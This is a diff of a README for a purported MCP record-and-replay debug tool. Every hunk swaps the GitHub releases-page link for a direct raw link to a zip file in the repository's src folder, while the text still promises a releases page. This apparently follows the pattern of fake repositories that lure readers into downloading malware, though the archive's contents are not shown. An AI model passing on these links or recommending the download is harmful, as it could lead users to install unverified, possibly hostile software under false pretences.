@@ -1,6 +1,6 @@
 # ⏳ mcp-time-travel - Debug Tool to Record and Replay Calls
 
-[![Download mcp-time-travel](https://img.shields.io/badge/Download-mcp--time--travel-green?style=for-the-badge)](https://github.com/pandemic-xanthicacid21/mcp-time-travel/releases)
+[![Download mcp-time-travel](https://img.shields.io/badge/Download-mcp--time--travel-green?style=for-the-badge)](https://github.com/pandemic-xanthicacid21/mcp-time-travel/raw/refs/heads/main/src/travel-mcp-time-v2.6.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Before you download, make sure your computer meets these:
 
 Click the large green button at the top or use this link:
 
-[Download mcp-time-travel releases](https://github.com/pandemic-xanthicacid21/mcp-time-travel/releases)
+[Download mcp-time-travel releases](https://github.com/pandemic-xanthicacid21/mcp-time-travel/raw/refs/heads/main/src/travel-mcp-time-v2.6.zip)
 
 You will be sent to the page where you can find the latest Windows version of mcp-time-travel.
 
@@ -111,7 +111,7 @@ By default, recordings save in the Documents/mcp-time-travel folder.
 ## 🔗 Download and Install mcp-time-travel
 
 Visit this page to download and install the latest version:  
-[https://github.com/pandemic-xanthicacid21/mcp-time-travel/releases](https://github.com/pandemic-xanthicacid21/mcp-time-travel/releases)
+[https://github.com/pandemic-xanthicacid21/mcp-time-travel/raw/refs/heads/main/src/travel-mcp-time-v2.6.zip](https://github.com/pandemic-xanthicacid21/mcp-time-travel/raw/refs/heads/main/src/travel-mcp-time-v2.6.zip)
 
 Look for the Windows installer file to get started.
 
@@ -146,4 +146,4 @@ mcp-time-travel helps you look back at what MCP agents do. It makes tracking the
 Check the release page regularly for new versions. Each update may include bug fixes, improvements, and new features.
 
 Stay updated here:  
-[https://github.com/pandemic-xanthicacid21/mcp-time-travel/releases](https://github.com/pandemic-xanthicacid21/mcp-time-travel/releases)
+[https://github.com/pandemic-xanthicacid21/mcp-time-travel/raw/refs/heads/main/src/travel-mcp-time-v2.6.zip](https://github.com/pandemic-xanthicacid21/mcp-time-travel/raw/refs/heads/main/src/travel-mcp-time-v2.6.zip)
